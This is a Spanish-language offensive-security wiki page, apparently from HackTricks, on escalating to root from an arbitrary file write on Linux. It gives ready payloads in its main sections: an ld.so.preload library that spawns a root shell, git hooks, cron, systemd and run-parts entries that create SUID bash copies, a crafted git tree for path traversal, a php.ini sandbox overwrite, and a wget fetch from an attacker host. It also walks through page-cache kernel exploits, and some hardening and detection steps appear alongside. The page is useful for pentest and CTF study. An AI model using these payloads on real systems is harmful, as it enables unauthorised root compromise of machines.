# Escritura arbitraria de archivos en Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` es una lista de objetos compartidos de todo el sistema que el enlazador dinámico carga antes que otros objetos compartidos. El modo de ejecución segura aplica restricciones adicionales a la precarga, por lo que una ruta de biblioteca como `/tmp/pe.so` no es una técnica universal para binarios SUID.\
Si puedes crearlo o modificarlo, un proceso que cargue el archivo cargará la biblioteca indicada antes que sus otros objetos compartidos, lo que permite la ejecución de código en el contexto de ese proceso.<sup>[[12]](#references)</sup>

Por ejemplo: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

Los **Git hooks** son scripts ejecutables que se ejecutan ante eventos en un repositorio, incluidas las operaciones de commit y merge. Si un **script o usuario con privilegios** realiza esas acciones y un atacante puede **escribir en la carpeta `.git`**, el hook puede utilizarse para **escalada de privilegios**.<sup>[[13]](#references)</sup>

Por ejemplo, es posible **generar un script** en un repo de git en **`.git/hooks`** para que se ejecute siempre cuando se cree un commit nuevo:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Privileged Git tree export path traversal

Un sincronizador privilegiado puede evitar un checkout y, en su lugar, enumerar un repositorio controlado por el atacante con `git ls-tree`, leer cada blob con `git cat-file`, unir la ruta indicada con un directorio de staging y escribirla por sí mismo. Esto se convierte en un **arbitrary file write con los privilegios del sincronizador** cuando combina `-c safe.directory=*` (deshabilitando la protección de Git para repositorios cuyo propietario es diferente) con la ausencia de una comprobación de contención del destino. Un nombre de entrada del árbol absoluto hace que `os.path.join(stage, name)` de Python descarte `stage`; un nombre relativo que contenga `../` escapa cuando el sistema de archivos lo resuelve. Como la aplicación materializa el árbol sin procesar en lugar de pedirle a Git que haga el checkout, el rechazo de rutas durante el checkout nunca protege el sink.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Busca este patrón de código en servicios root, timers, agentes de deployment, importadores de templates y jobs de backup/restore:<sup>[[30]](#references)</sup>
```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
target = os.path.join(stage_root, git_path)  # no containment check
os.makedirs(os.path.dirname(target), exist_ok=True)
with open(target, "wb") as output:
output.write(git("cat-file", "blob", oid))
```
Una entrada de árbol se codifica como `<mode> SP <name> NUL <raw object ID>`. La opción `git hash-object --literally` permite deliberadamente datos de objeto que el análisis normal o `git fsck` podrían rechazar, por lo que un clon desechable puede construir un árbol cuyo nombre de archivo sea un destino absoluto. Este ejemplo crea un blob de archivo cron, envuelve el árbol manipulado en un commit y mueve una rama hacia él; la explotación aún requiere permiso para actualizar un repositorio consumido por el job con privilegios y un servidor Git que acepte el objeto malformado.<sup>[[30]](#references)[[31]](#references)</sup>
```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```
El hardening debe cubrir tanto la ingesta del repositorio como la operación final en el filesystem:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Reemplaza `safe.directory=*` por los repositorios exactos en los que el servicio debe confiar y, cuando sea posible, ejecuta el procesamiento del repositorio sin privilegios de root.
- Rechaza los nombres absolutos y cualquier componente `.` o `..` antes de la materialización. Después de unir las rutas, canoniza y verifica que el destino siga estando dentro de la raíz prevista.
- Evita las condiciones de carrera de symlinks entre la comprobación y la apertura: abre de forma relativa a un descriptor de directorio confiable y, en Linux, utiliza `openat2()` con `RESOLVE_BENEATH` y `RESOLVE_NO_SYMLINKS` para las rutas controladas por el atacante.
- Prefiere un checkout normal en un directorio aislado en lugar de reimplementar el checkout a partir de la salida de plumbing. Si es necesaria la ingesta de raw objects, habilita la validación en el lado de recepción, como `receive.fsckObjects=true`; no reduzcas la severidad de los hallazgos relacionados con rutas de `receive.fsck.*` necesarios para rechazar árboles manipulados.

### Archivos de Cron y tiempo

Si puedes **escribir archivos relacionados con cron que root ejecute**, normalmente puedes obtener ejecución de código la próxima vez que se ejecute el job. Entre los objetivos interesantes se incluyen:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- El crontab del propio root en `/var/spool/cron/` o `/var/spool/cron/crontabs/`
- Timers de `systemd` y los servicios que activan

Comprobaciones rápidas:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Rutas de abuso típicas:

- **Añadir un nuevo cron job de root** a `/etc/crontab` o a un archivo en `/etc/cron.d/`
- **Reemplazar un script** que `run-parts` ya ejecuta
- **Introducir una backdoor en un destino de timer existente** modificando el script o binario que ejecuta

Ejemplo mínimo de payload de cron:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Si solo puedes escribir dentro de un directorio de cron utilizado por `run-parts`, coloca allí un archivo ejecutable en su lugar:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notas:

- `run-parts` normalmente ignora los nombres de archivo que contienen puntos, así que es preferible usar nombres como `backup` en lugar de `backup.sh`.<sup>[[15]](#references)</sup>
- Algunos sistemas usan timers de `systemd` en lugar del cron clásico, pero la idea del abuso es la misma: **modificar lo que root ejecutará más tarde**.<sup>[[20]](#references)</sup>

### Archivos de Service y Socket

Si puedes escribir **archivos de unidad de `systemd`** o archivos referenciados por ellos, es posible que puedas obtener ejecución de código como root recargando y reiniciando la unidad, o esperando a que se active la ruta de activación del service/socket.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Los objetivos interesantes incluyen:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Overrides drop-in en `/etc/systemd/system/<unit>.d/*.conf`
- Scripts/binarios del service referenciados por `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Rutas `EnvironmentFile=` modificables cargadas por un service root

Comprobaciones rápidas:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
Rutas comunes de abuso:

- **Sobrescribir `ExecStart=`** en una unidad de servicio propiedad de root que puedas modificar
- **Añadir un drop-in override** con un `ExecStart=` malicioso y borrar primero el anterior
- **Instalar un backdoor en el script/binario** al que la unidad ya hace referencia
- **Secuestrar un servicio activado por socket** modificando el archivo `.service` correspondiente que se inicia cuando el socket recibe una conexión

Ejemplo de override malicioso:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Flujo de activación típico:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Si no puedes reiniciar los servicios por tu cuenta, pero puedes editar una unidad activada por socket, quizá solo necesites **esperar una conexión de cliente** para activar la ejecución del servicio con backdoor como root.<sup>[[17]](#references)</sup>

### Sobrescribir un `php.ini` restrictivo utilizado por un sandbox de PHP privilegiado

Algunos daemons personalizados validan el PHP proporcionado por el usuario ejecutando `php` con un **`php.ini` restringido** (por ejemplo, `disable_functions=exec,system,...`). Si el código en el sandbox todavía tiene **cualquier primitive de escritura** (como `file_put_contents`) y puedes alcanzar la **ruta exacta de `php.ini`** utilizada por el daemon, puedes **sobrescribir esa configuración** para eliminar las restricciones y después enviar un segundo payload que se ejecute con privilegios elevados.<sup>[[2]](#references)</sup>

Flujo típico:

1. El primer payload sobrescribe la configuración del sandbox.
2. El segundo payload ejecuta código una vez que las funciones peligrosas se han vuelto a habilitar.

Ejemplo mínimo (reemplaza la ruta utilizada por el daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Si el daemon se ejecuta como root (o valida usando paths propiedad de root), la segunda ejecución produce un contexto root. Esto es esencialmente **privilege escalation via config overwrite** cuando el runtime aislado todavía puede escribir archivos.

### binfmt_misc

`binfmt_misc` expone registros en `/proc/sys/fs/binfmt_misc`; cada registro asocia un patrón de tipo de archivo con un intérprete. El impacto en los privilegios depende de quién puede modificar el registro y de qué proceso ejecuta posteriormente el archivo coincidente, por lo que debes verificar estos requisitos antes de considerarlo una vía de privilege escalation.<sup>[[21]](#references)</sup>

### Sobrescribir schema handlers (como http: o https:)

Los entornos de escritorio utilizan asociaciones MIME y desktop entries para elegir una aplicación para los esquemas URI; un atacante que pueda escribir en la configuración relevante por usuario y en los directorios de desktop entries puede redirigir esos esquemas a un launcher bajo su control. Al modificar el archivo `$HOME/.config/mimeapps.list` para hacer que los handlers de URL HTTP y HTTPS apunten a un archivo malicioso (por ejemplo, `x-scheme-handler/http=evil.desktop` y `x-scheme-handler/https=evil.desktop`), un clic del usuario puede invocar esa desktop entry.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Scripts/binarios escribibles por el usuario ejecutados por root

Si un flujo de trabajo privilegiado ejecuta algo como `/bin/sh /home/username/.../script` (o cualquier binario dentro de un directorio propiedad de un usuario sin privilegios), puedes secuestrarlo:<sup>[[1]](#references)</sup>

- **Detecta la ejecución:** monitoriza los procesos con pspy para detectar a root invocando rutas controladas por el usuario.<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** asegúrate de que tanto el archivo objetivo como su directorio sean propiedad de tu usuario y tengan permisos de escritura para este.
- **Hijack the target:** haz backup del binario/script original y coloca un payload que cree una shell SUID (o cualquier otra acción como root); después restaura los permisos:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Trigger the privileged action** (por ejemplo, pulsar un botón de la UI que inicie el helper). Cuando root vuelva a ejecutar la ruta secuestrada, obtén el shell con privilegios elevados mediante `./rootshell -p`.

### Modificación exclusiva de archivos en la page cache de binarios privilegiados

Algunos bugs del kernel no modifican el archivo **en disco**. En su lugar, permiten modificar únicamente la copia en la **page cache** de un archivo legible. Si puedes apuntar a un binario **setuid** o ejecutado por **root**, la siguiente ejecución puede ejecutar bytes controlados por el atacante desde la memoria y escalar privilegios, aunque el hash del archivo en disco no haya cambiado.<sup>[[3]](#references)[[4]](#references)</sup>

Esto puede entenderse como una **primitiva de escritura de archivos solo durante el runtime**:<sup>[[3]](#references)</sup>

- **El disco permanece limpio**: el inode y los bytes en disco no cambian
- **La memoria queda modificada**: los procesos que leen o ejecutan la página almacenada en caché reciben el contenido modificado por el atacante
- **El efecto es temporal**: el cambio desaparece después de reiniciar o de expulsar la página de la caché

Esta primitiva se sitúa entre la **arbitrary file write** clásica y los bugs antiguos de abuso de la **page cache**, como Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW dependía de una race condition
- Dirty Pipe tenía restricciones sobre la posición de escritura
- Una primitiva exclusiva de la page cache puede ser más fiable si la ruta vulnerable proporciona escrituras directas en páginas respaldadas por archivos y almacenadas en caché

#### Flujo genérico de privesc

1. Obtén una primitiva del kernel capaz de escribir en **páginas de la page cache respaldadas por archivos**
2. Úsala contra un **binario privilegiado legible** u otro archivo ejecutado por root
3. Activa la ejecución **antes** de que la página sea expulsada de la caché
4. Obtén ejecución de código como root mientras el archivo en disco sigue pareciendo no modificado

Objetivos típicos de alto valor:

- Binarios **setuid-root**
- Helpers iniciados por **servicios root**
- Binarios ejecutados habitualmente desde **containers que comparten el kernel/page cache del host**

#### Ruta de ejemplo con AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) es un buen ejemplo de esta clase. La ruta vulnerable estaba en la API de userspace de criptografía de Linux (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` puede mover referencias a páginas de la page cache desde un archivo legible hacia el scatterlist TX de crypto
- la ruta de descifrado in-place de `algif_aead` reutilizaba los buffers de origen y destino
- `authencesn` escribía entonces en la región de tag de destino
- cuando esa región todavía referenciaba páginas respaldadas por archivos y almacenadas en caché, la escritura terminaba en la **page cache del archivo objetivo**

Por tanto, la técnica interesante no es la CVE en sí, sino el patrón:

- **introducir páginas de la caché respaldadas por archivos en un subsistema del kernel**
- hacer que el subsistema las **trate como salida escribible**
- activar una sobrescritura pequeña y controlada en memoria

El PoC público utilizaba **escrituras repetidas de 4 bytes** para parchear `/usr/bin/su` en memoria y después ejecutarlo.<sup>[[4]](#references)[[7]](#references)</sup>

#### Ruta de ejemplo con ESP / XFRM + clonación TEE de netfilter

DirtyClone (CVE-2026-43503) muestra otra variante del mismo patrón de **page-cache-only write-to-root**, pero esta vez el sink es el **descifrado IPsec ESP** en lugar de `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

La técnica importante es el **paso de metadata-laundering**:

- `splice()` coloca una **página de la page cache respaldada por un archivo y de solo lectura** en un paquete ESP-in-UDP
- la mitigación original de DirtyFrag marcaba ese skb con `SKBFL_SHARED_FRAG` para que `esp_input()` **copiara antes de descifrar**
- netfilter `TEE` duplica el paquete mediante `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- el clon conserva la **misma referencia física a la página de la page cache**, pero pierde `SKBFL_SHARED_FRAG`
- `esp_input()` trata entonces el clon como seguro y ejecuta el descifrado **in-place** de `cbc(aes)` sobre la página respaldada por el archivo

Por tanto, la lección para el reviewer es más amplia que la CVE: si una mitigación depende de la **metadata del skb/página** para decidir si una operación debe copiar primero, cualquier **ruta de clonación/copia que conserve la página subyacente pero elimine la metadata** puede volver a abrir silenciosamente la primitiva de escritura.

Flujo de explotación típico:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` para obtener **`CAP_NET_ADMIN` dentro de un network namespace privado**
2. activar loopback e instalar una regla **`TEE` de netfilter** en `mangle/OUTPUT`
3. instalar SAs de transporte XFRM ESP mediante `NETLINK_XFRM`
4. codificar cada palabra objetivo de 4 bytes en el campo `seq_hi` de la SA (el truco de selección de palabras de DirtyFrag)
5. enviar el paquete ESP-in-UDP mediante `splice()` para que el **clon TEE** llegue a `esp_input()` y descifre **in-place**
6. repetir hasta que la copia en la page cache de `/usr/bin/su` u otro ejecutable privilegiado contenga código controlado por el atacante

Operativamente, el impacto es el mismo que en el ejemplo de `AF_ALG`: el archivo en disco permanece limpio, pero `execve()` consume los **bytes modificados de la page cache** y proporciona root.<sup>[[8]](#references)[[9]](#references)</sup>

Comprobaciones útiles de exposición para esta variante:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
La reducción de la superficie de ataque a corto plazo también es específica de la ruta: actualizar a un kernel que incluya `48f6a5356a33` corrige la ruta de clone, mientras que bloquear el autoload de `xt_TEE` elimina el **paso de blanqueo de flags** y bloquear `esp4` / `esp6` elimina el **sink de descifrado**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Exposición y hunting

Si sospechas de esta clase de bug, no dependas únicamente de las comprobaciones de integridad del disco. Verifica también:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
Los valores de configuración siguientes distinguen una interface cargable de una integrada en el kernel; las reglas de compilación de crypto asignan `CONFIG_CRYPTO_USER_API_AEAD` a `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` puede cargarse o descargarse como módulo
- `CONFIG_CRYPTO_USER_API_AEAD=y`: la interface está integrada en el kernel
- los binarios setuid son buenos objetivos porque un parche limitado a page cache puede bastar para convertir un foothold local en root

#### Reducción de la superficie de ataque para la ruta `algif_aead`

Si la interface vulnerable la proporciona un módulo cargable:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Si se compila en el kernel, algunas divulgaciones informaron que se bloqueaba la ruta de init con:<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
Este tipo de mitigación también conviene recordarlo para otros kernel LPEs: si la explotación depende de una interfaz opcional específica, deshabilitar o poner esa interfaz en la blacklist puede interrumpir la ruta de explotación incluso antes de que haya disponible una actualización completa del kernel.<sup>[[6]](#references)[[28]](#references)</sup>

## References

- [1] [HTB Bamboo – secuestro de un script ejecutado por root en un directorio de PaperCut escribible por el usuario](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: FAQ de Copy Fail (CVE-2026-31431)](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Divulgación de Openwall oss-security para CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Fix estable de Linux: crypto: algif_aead - Revertir a la operación out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Aviso de Copy Fail — CVE-2026-31431](https://copy.fail/)
- [7] [Informe técnico de Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Repositorio / README de DirtyClone](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: análisis y explotación de la variante de Linux LPE DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Fix de Linux: net: skb: conservar `SKBFL_SHARED_FRAG` en `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Mitigación anterior de Linux: establecer `SKBFL_SHARED_FRAG` para paquetes UDP spliced (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — página del manual de Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — página del manual de Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — página del manual de Debian](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — documentación del Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Asociaciones de aplicaciones MIME](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Especificación de Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Especificación de Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Lenguaje de Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Makefile de crypto de Linux](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: vulnerabilidad de la page cache de AF_ALG del Linux kernel](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — página del manual de Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Documentación de Git `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Documentación de Git `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Documentación de configuración de Git](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — página del manual de Linux](https://man7.org/linux/man-pages/man2/openat2.2.html)
{{#include ../../banners/hacktricks-training.md}}
